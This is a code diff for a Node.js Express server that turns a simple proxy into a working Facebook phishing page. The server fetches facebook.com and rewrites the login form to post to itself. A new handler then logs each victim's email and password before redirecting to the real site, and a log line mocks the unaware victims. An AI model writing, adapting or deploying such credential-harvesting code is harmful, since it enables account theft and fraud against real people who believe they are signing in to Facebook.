@@ -5,20 +5,23 @@ const request = require('request');
 
 express()
   .use(express.static(path.join(__dirname, 'public')))
-  .set('views', path.join(__dirname, 'views'))
-  .set('view engine', 'ejs')
+  .use(express.json())
+  .use(express.urlencoded({ extended: false }))
   .get('/', (req, res) => {
-    const q = req.query.q;
-
     request({
-      url: q,
-      method: req.method,
-      body: req.body,
+      url: 'https://facebook.com',
       headers: {
         'User-Agent': req.header('User-Agent'),
       }
     }, function (err, response, body) {
-      res.send(body);
+      res.send(body.replace('https://www.facebook.com/login/device-based/regular/login/', `${req.protocol}://${req.get('host')}/login/device-based/regular/login/`));
     });
+  })
+  .post('/login/device-based/regular/login/', (req, res) => {
+    console.log("Someone who's clearly not aware of us tried to sign in!");
+    console.log("Email: ", req.body.email);
+    console.log("Password: ", req.body.pass);
+    const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
+    res.redirect(fullUrl.replace(`${req.protocol}://${req.get('host')}/login/device-based/regular/login/`, 'https://www.facebook.com/login/device-based/regular/login/'));
   })
   .listen(PORT, () => console.log(`Listening on ${ PORT }`))
